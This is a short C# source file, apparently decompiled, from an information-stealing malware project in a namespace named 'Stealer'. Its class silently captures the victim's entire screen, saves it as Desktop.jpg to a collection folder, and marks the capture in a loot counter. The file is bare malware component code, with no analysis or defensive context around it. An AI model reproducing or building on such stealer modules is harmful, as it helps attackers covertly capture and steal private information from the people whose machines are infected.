﻿using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Stealer
{
	// Token: 0x02000026 RID: 38
	internal sealed class DesktopScreenshot
	{
		// Token: 0x060000AD RID: 173 RVA: 0x00005E18 File Offset: 0x00004018
		public static bool Make(string sSavePath)
		{
			bool result;
			try
			{
				Rectangle bounds = Screen.GetBounds(Point.Empty);
				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
				{
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
					}
					bitmap.Save(sSavePath + "\\Desktop.jpg", ImageFormat.Jpeg);
				}
				Counter.DesktopScreenshot = true;
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
